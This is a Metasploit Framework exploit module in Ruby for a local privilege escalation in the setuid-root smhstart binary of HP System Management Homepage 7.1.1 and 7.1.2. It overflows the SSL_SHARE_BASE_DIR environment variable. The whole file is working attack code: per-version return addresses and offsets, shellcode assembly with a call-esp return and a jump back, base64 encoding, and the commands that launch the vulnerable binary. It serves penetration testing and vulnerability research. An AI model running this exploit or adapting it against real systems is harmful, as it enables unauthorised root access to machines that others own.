# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require &#039;msf/core&#039;
require &#039;rex&#039;
require &#039;msf/core/post/common&#039;
require &#039;msf/core/exploit/local/linux&#039;
require &#039;msf/core/exploit/exe&#039;

class Metasploit4 < Msf::Exploit::Local

  include Msf::Exploit::EXE
  include Msf::Post::File
  include Msf::Post::Common

  include Msf::Exploit::Local::Linux

  def initialize(info={})
    super( update_info( info, {
        &#039;Name&#039;          => &#039;HP System Management Homepage Local Privilege Escalation&#039;,
        &#039;Description&#039;   => %q{
            Versions of HP System Management Homepage <= 7.1.2 include a setuid root
          smhstart which is vulnerable to a local buffer overflow in SSL_SHARE_BASE_DIR
          env variable.
        },
        &#039;License&#039;       => MSF_LICENSE,
        &#039;Author&#039;        =>
          [
            &#039;agix&#039; # @agixid # Vulnerability discovery and Metasploit module
          ],
        &#039;Platform&#039;      => [ &#039;linux&#039; ],
        &#039;Arch&#039;          => [ ARCH_X86 ],
        &#039;SessionTypes&#039;  => [ &#039;shell&#039; ],
        &#039;Payload&#039;    =>
          {
            &#039;Space&#039;     => 227,
            &#039;BadChars&#039;   => "\x00\x22"
          },
        &#039;References&#039;    =>
          [
            [&#039;OSVDB&#039;, &#039;91990&#039;]
          ],
        &#039;Targets&#039;       =>
          [
            [ &#039;HP System Management Homepage 7.1.1&#039;,
              {
                &#039;Arch&#039; => ARCH_X86,
                &#039;CallEsp&#039; => 0x080c86eb, # call esp
                &#039;Offset&#039; => 58
              }
            ],
            [ &#039;HP System Management Homepage 7.1.2&#039;,
              {
                &#039;Arch&#039; => ARCH_X86,
                &#039;CallEsp&#039; => 0x080c8b9b, # call esp
                &#039;Offset&#039; => 58
              }
            ],
          ],
        &#039;DefaultOptions&#039; =>
          {
            &#039;PrependSetuid&#039;    => true
          },
        &#039;DefaultTarget&#039; => 0,
        &#039;DisclosureDate&#039; => "Mar 30 2013",
      }
      ))
    register_options([
        OptString.new("smhstartDir", [ true, "smhstart directory", "/opt/hp/hpsmh/sbin/" ])
      ], self.class)
  end

  def exploit
    pl = payload.encoded
    padding = rand_text_alpha(target[&#039;Offset&#039;])
    ret = [target[&#039;CallEsp&#039;]].pack(&#039;V&#039;)
    exploit =  pl
    exploit << ret
    exploit << "\x81\xc4\x11\xff\xff\xff"   # add esp, 0xffffff11
    exploit << "\xe9\x0e\xff\xff\xff"    # jmp => begining of pl
    exploit << padding
    exploit_encoded = Rex::Text.encode_base64(exploit) # to not break the shell base64 is better
    id=cmd_exec("id -un")
    if id!="hpsmh"
      fail_with(Exploit::Failure::NoAccess, "You are #{id}, you must be hpsmh to exploit this")
    end
    cmd_exec("export SSL_SHARE_BASE_DIR=$(echo -n &#039;#{exploit_encoded}&#039; | base64 -d)")
    cmd_exec("#{datastore[&#039;smhstartDir&#039;]}/smhstart")
  end

end

